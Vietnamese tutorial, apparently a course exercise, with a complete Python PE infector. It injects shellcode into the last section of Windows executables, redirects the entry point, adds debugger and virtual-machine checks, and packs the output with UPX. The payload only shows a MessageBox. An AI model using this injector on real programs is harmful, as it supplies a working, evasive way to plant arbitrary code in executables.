### Chèn shellcode vào section cuối

Để quá trình thêm shellcode không làm mất file exe gốc, chúng ta sẽ tiến hành copy file này ra thành 1 file khác. File mới sẽ có gắn thêm đuôi **-injected**
```python
import shutil

input_name = "calc.exe"
output_name = input_name.replace('.exe', '-injected.exe')

shutil.copy2(input_name, output_name)
```

Tiếp theo, chúng ta cần thay đổi kích thước file PE (tăng thêm 0x1000 bytes), để có chỗ chứa shellcode
```python
original_size = os.path.getsize(output_name)
print "[+] Original Size = %d bytes" % original_size
fd = open(output_name, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x1000)
map.close()
fd.close()
print "[+] New Size = %d bytes\n" % os.path.getsize(output_name)
```

Để shellcode có thể hiển thị MessageBox khi mở app lên, bắt buộc file PE phải có import hàm MessageBoxW nằm trong thư viện USER32.dll. Chúng ta sẽ tìm địa chỉ của hàm MesssageBoxW như sau:
```python
address_of_message_box_w = None
for entry in pe.DIRECTORY_ENTRY_IMPORT:
  dll_name = entry.dll.decode('utf-8')
  if dll_name == "USER32.dll":
    for func in entry.imports:
      if func.name.decode('utf-8') == "MessageBoxW":
        address_of_message_box_w = func.address

if not address_of_message_box_w:
  print "[-] PE file not imported MessageBoxW"
  exit()
print "[*] Address of MessageBoxW = %s" % hex(address_of_message_box_w)
```
  Nếu file PE không import MessageBoxW thì chương trình sẽ dừng không cho chạy tiếp, vì không có hàm MessageBoxW làm sao hiện thông báo được đây!
  
  Chúng ta cũng cần một số thông tin từ file PE như **ImageBase**, **AddressOfEntryPoint** để tính toán
  ```python
image_base = pe.OPTIONAL_HEADER.ImageBase
entry_point_old = pe.OPTIONAL_HEADER.AddressOfEntryPoint
  ```
  
  Shellcode sẽ được chèn vào section cuối của file PE, chúng ta sẽ lấy thông tin section cuối ra.
  ```python
last_section = pe.sections[-1]
print "[+] Last section info: %s" % last_section 
last_section_virtual_offset = last_section.VirtualAddress + last_section.Misc_VirtualSize
last_section_raw_offset = last_section.PointerToRawData + last_section.SizeOfRawData
  ```
  Chúng ta sẽ cần biến **raw_address_of_shell_code** để chứa shellcode, biến **raw_address_of_caption** để chứa Caption và **raw_address_of_text** để chứa Text
  ```python
raw_address_of_shell_code = original_size
raw_address_of_caption = raw_address_of_shell_code + 0x50
raw_address_of_text = raw_address_of_shell_code + 0x70
  ```
  
  
  Từ **Phần 1** chúng ta thu được shellcode
  ```
33 C0
40
0F A2
0F BA E1 1F
72 22
64 FF 35 30 00 00 00
5A
80 7A 02 01
74 14
6A 00
68 <address of Caption>(X)
68 <address of Text>(Y)
6A 00
FF 15 <address of MessageBox>
E9 <address of Entry Point>(Z)
```

Việc bây giờ ta cần làm là tìm 3 giá trị **X, Y, Z** để điền vào shellcode.

X = virtual_address_of_caption

Y = virtual_address_of_text

Z = jump_address

```python
virtual_address_of_caption = raw_address_of_caption - last_section.PointerToRawData + last_section.VirtualAddress + image_base
virtual_address_of_text = raw_address_of_text - last_section.PointerToRawData + last_section.VirtualAddress + image_base
new_entry_point = raw_address_of_shell_code - last_section.PointerToRawData + last_section.VirtualAddress + image_base
entry_point_fix = new_entry_point - image_base
jump_address = (entry_point_old + image_base - 5 - new_entry_point - 45) & 0xffffffff
```


Đã xong, giờ ghi shellcode vào đúng offset
```python
shellcode = '\x33\xC0'
shellcode += '\x40'
shellcode += '\x0F\xA2'
shellcode += '\x0F\xBA\xE1\x1F'
shellcode += '\x72\x22'
shellcode += '\x64\xFF\x35\x30\x00\x00\x00'
shellcode += '\x5A'
shellcode += '\x80\x7A\x02\x01'
shellcode += '\x74\x14'
shellcode += '\x6A\x00'
shellcode += '\x68' + struct.pack("I", virtual_address_of_caption)
shellcode += '\x68' + struct.pack("I", virtual_address_of_text)
shellcode += '\x6A\x00'
shellcode += '\xFF\x15'
shellcode += struct.pack("I", address_of_message_box_w)
shellcode += '\xE9' + struct.pack("I", jump_address)
shellcode += '\x00' * 30
shellcode += '\x49\x00\x6e\x00\x66\x00\x6f\x00'
shellcode += '\x00' * 24
shellcode += '\x49\x00\x6E\x00\x6A\x00\x65\x00\x63\x00\x74\x00\x65\x00\x64\x00\x20\x00\x62\x00\x79\x00\x20\x00\x31\x00\x37\x00\x35\x00\x32\x00\x31\x00\x31\x00\x31\x00\x34\x00\x20\x00\x2D\x00\x20\x00\x31\x00\x37\x00\x35\x00\x32\x00\x30\x00\x37\x00\x36\x00\x36'

pe.set_bytes_at_offset(raw_address_of_shell_code, shellcode)
```

Cập nhật lại một số thuộc tính của file PE và ghi vào file các thay đổi:
```python
pe.OPTIONAL_HEADER.AddressOfEntryPoint = entry_point_fix
last_section.Misc_VirtualSize += 0x1000
last_section.SizeOfRawData += 0x1000
pe.OPTIONAL_HEADER.SizeOfImage += 0x1000
pe.write(output_name)
print "[+] Inject successfully!!!"
```

Cuối cùng là Pack file PE bằng UPX
```python
print "[+] Packing using UPX..."
args = ['./upx.exe', output_name]
res = subprocess.Popen(args, stdout=subprocess.PIPE)
output, err = res.communicate()

if not err:
  print output
else:
  print err
```

Chúng ta sẽ test chương trình vừa viết bằng một mảng các file input, sau đó inject shellcode và ghi vào thư mục output:
```python
test_files = [
	'calc.exe',
	'mspaint.exe',
	'notepad.exe',
	'spider.exe',
	'taskmgr.exe',
	'winmine.exe'
]

for input_name in test_files:
	output_name = input_name.replace('.exe', '-injected.exe')
	inject_shellcode('input/%s' % input_name, 'output/%s' % output_name)
```

Chương trình hoàn thiện:
```python
# -*- coding: utf-8 -*-

import pefile
import mmap
import os
import shutil
import struct
import subprocess



def align(value_to_align, alignment):
	return int(((value_to_align + alignment - 1) / alignment) * alignment)


def inject_shellcode(input_name, output_name):
	print "\n\n[*] Injecting shellcode to %s ..." % input_name
	shutil.copy2(input_name, output_name)

	original_size = os.path.getsize(output_name)
	print "[+] Original Size = %d bytes" % original_size
	fd = open(output_name, 'a+b')
	map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
	map.resize(original_size + 0x1000)
	map.close()
	fd.close()

	print "[+] New Size = %d bytes\n" % os.path.getsize(output_name)

	pe =  pefile.PE(output_name)



	address_of_message_box_w = None
	for entry in pe.DIRECTORY_ENTRY_IMPORT:
		dll_name = entry.dll.decode('utf-8')
		if dll_name == "USER32.dll":
			for func in entry.imports:
				if func.name.decode('utf-8') == "MessageBoxW":
					address_of_message_box_w = func.address

	if not address_of_message_box_w:
		print "[-] PE file not imported MessageBoxW"
		return False


	print "[*] Address of MessageBoxW = %s" % hex(address_of_message_box_w)


	image_base = pe.OPTIONAL_HEADER.ImageBase
	entry_point_old = pe.OPTIONAL_HEADER.AddressOfEntryPoint


	last_section = pe.sections[-1]

	print "[+] Last section info: %s" % last_section 






	raw_address_of_shell_code = original_size
	raw_address_of_caption = raw_address_of_shell_code + 0x50
	raw_address_of_text = raw_address_of_shell_code + 0x70

	virtual_address_of_caption = raw_address_of_caption - last_section.PointerToRawData + last_section.VirtualAddress + image_base
	virtual_address_of_text = raw_address_of_text - last_section.PointerToRawData + last_section.VirtualAddress + image_base
	new_entry_point = raw_address_of_shell_code - last_section.PointerToRawData + last_section.VirtualAddress + image_base


	entry_point_fix = new_entry_point - image_base
	jump_address = (entry_point_old + image_base - 5 - new_entry_point - 45) & 0xffffffff



	shellcode = '\x33\xC0'
	shellcode += '\x40'
	shellcode += '\x0F\xA2'
	shellcode += '\x0F\xBA\xE1\x1F'
	shellcode += '\x72\x22'
	shellcode += '\x64\xFF\x35\x30\x00\x00\x00'
	shellcode += '\x5A'
	shellcode += '\x80\x7A\x02\x01'
	shellcode += '\x74\x14'
	shellcode += '\x6A\x00'
	shellcode += '\x68' + struct.pack("I", virtual_address_of_caption)
	shellcode += '\x68' + struct.pack("I", virtual_address_of_text)
	shellcode += '\x6A\x00'
	shellcode += '\xFF\x15'
	shellcode += struct.pack("I", address_of_message_box_w)
	shellcode += '\xE9' + struct.pack("I", jump_address)
	shellcode += '\x00' * 30

	shellcode += '\x49\x00\x6e\x00\x66\x00\x6f\x00'
	shellcode += '\x00' * 24
	shellcode += '\x49\x00\x6E\x00\x6A\x00\x65\x00\x63\x00\x74\x00\x65\x00\x64\x00\x20\x00\x62\x00\x79\x00\x20\x00\x31\x00\x37\x00\x35\x00\x32\x00\x31\x00\x31\x00\x31\x00\x34\x00\x20\x00\x2D\x00\x20\x00\x31\x00\x37\x00\x35\x00\x32\x00\x30\x00\x37\x00\x36\x00\x36'




	pe.set_bytes_at_offset(raw_address_of_shell_code, shellcode)

	pe.OPTIONAL_HEADER.AddressOfEntryPoint = entry_point_fix
	last_section.Misc_VirtualSize += 0x1000
	last_section.SizeOfRawData += 0x1000
	pe.OPTIONAL_HEADER.SizeOfImage += 0x1000
	pe.write(output_name)

	print "[+] Inject successfully!!!"
	print "[+] Packing using UPX..."
	args = ['./upx.exe', output_name]
	res = subprocess.Popen(args, stdout=subprocess.PIPE)
	output, err = res.communicate()

	if not err:
		print output
		return True

	print err
	return False

def main():
	test_files = [
		'calc.exe',
		'mspaint.exe',
		'notepad.exe',
		'spider.exe',
		'taskmgr.exe',
		'winmine.exe'
	]

	for input_name in test_files:
		output_name = input_name.replace('.exe', '-injected.exe')
		inject_shellcode('input/%s' % input_name, 'output/%s' % output_name)

if __name__ == '__main__':
	main()
```
